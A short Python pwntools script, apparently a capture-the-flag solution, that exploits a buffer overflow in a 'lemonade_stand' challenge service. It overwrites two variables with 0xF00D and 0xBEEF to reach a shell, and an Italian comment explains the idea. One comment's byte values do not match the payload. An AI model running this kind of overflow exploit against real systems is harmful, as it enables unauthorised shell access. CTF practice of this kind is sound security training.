#!/usr/bin/env python3
from pwn import *

REMOTE_HOST = "offsec.m0lecon.it"
REMOTE_PORT = 13553

#context.binary = elf = ELF("../lemonade_stand", checksec=False)

p = remote(REMOTE_HOST, REMOTE_PORT)
#p = process(elf.path)
p.recvuntil(b'order?')          

OFFSET_BUF_TO_VAR = 40        # offset rispetto all prima variabile


"""
L'idea è di sfruttare l'overflw per sovrascrivere le due variabili "sauce" e  "cheese" rispettivamente nei valori "0xF00D" e "0xBEEF" permettendo l'accesso nel "giusto"  ramo ed esponendomi una shell
"""

payload = b"A"*OFFSET_BUF_TO_VAR + p32(0xF00D) + p32(0xBEEF) # little-endian: 37 13 00 00

p.sendline(payload)
p.interactive()
